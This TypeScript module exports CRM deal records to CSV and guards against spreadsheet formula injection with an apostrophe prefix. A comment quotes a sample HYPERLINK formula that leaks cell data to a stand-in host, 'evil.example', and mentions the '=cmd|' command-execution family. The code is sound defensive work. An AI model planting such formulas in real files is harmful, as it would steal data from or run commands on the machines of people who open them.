import type Database from 'better-sqlite3';
import { expectedValueCents, stageByKey } from './pipeline-config.js';

/**
 * Deals → RFC-4180-style CSV: header row first, CRLF line endings,
 * quoting any cell that contains a comma, quote or newline. Money is
 * rendered as plain decimals (dot separator) so a spreadsheet reads it
 * as a number; expected value and probability are derived from the one
 * pipeline config, never stored.
 */

const COLUMNS = [
  'id',
  'title',
  'company',
  'primary_contact',
  'stage',
  'stage_label',
  'probability_pct',
  'value',
  'expected_value',
  'created_at',
] as const;

interface DealExportRow {
  id: number;
  title: string;
  company_name: string;
  contact_name: string | null;
  stage: string;
  value_cents: number;
  created_at: string;
}

/**
 * Neutralize spreadsheet formula injection (CWE-1236).
 *
 * Excel, LibreOffice Calc and Google Sheets evaluate any cell whose text
 * begins with `=`, `+`, `-`, `@`, a tab or a CR as a formula. RFC-4180
 * quoting below does NOT stop that — the quotes are stripped as the file is
 * parsed, and the cell is interpreted afterwards. Every column here carries
 * text somebody typed into this application, so a supplier or employee named
 * `=HYPERLINK("https://evil.example/?d="&A1,"Open")` becomes a live
 * exfiltration link the moment an operator opens the export, and the
 * `=cmd|'/c ...'!A1` family reaches further than that on Windows.
 *
 * A leading apostrophe forces the cell to text in all three programs and is
 * the standard mitigation. Plain numbers are exempt so `-42` stays a number:
 * a lone minus sign cannot start a formula, only an expression can.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/;

function neutralizeFormula(value: string): string {
  if (!FORMULA_LEAD.test(value) || PLAIN_NUMBER.test(value)) return value;
  return `'${value}`;
}

function escapeCell(raw: string): string {
  const value = neutralizeFormula(raw);
  if (value.includes('"') || value.includes(',') || /[\n\r]/.test(value)) {
    return `"${value.replaceAll('"', '""')}"`;
  }
  return value;
}

function decimals(cents: number): string {
  return (cents / 100).toFixed(2);
}

export function exportDealsCsv(db: Database.Database): string {
  const deals = db
    .prepare(
      `SELECT d.id, d.title, d.stage, d.value_cents, d.created_at,
              c.name AS company_name, k.name AS contact_name
       FROM deals d
       JOIN companies c ON c.id = d.company_id
       LEFT JOIN contacts k ON k.id = d.primary_contact_id
       ORDER BY d.id`,
    )
    .all() as DealExportRow[];

  const rows: string[] = [COLUMNS.join(',')];
  for (const deal of deals) {
    const stage = stageByKey(deal.stage)!;
    rows.push(
      [
        String(deal.id),
        deal.title,
        deal.company_name,
        deal.contact_name ?? '',
        deal.stage,
        stage.label,
        String(stage.probability),
        decimals(deal.value_cents),
        decimals(expectedValueCents(deal.value_cents, deal.stage)),
        deal.created_at,
      ]
        .map(escapeCell)
        .join(','),
    );
  }
  return rows.join('\r\n') + '\r\n';
}
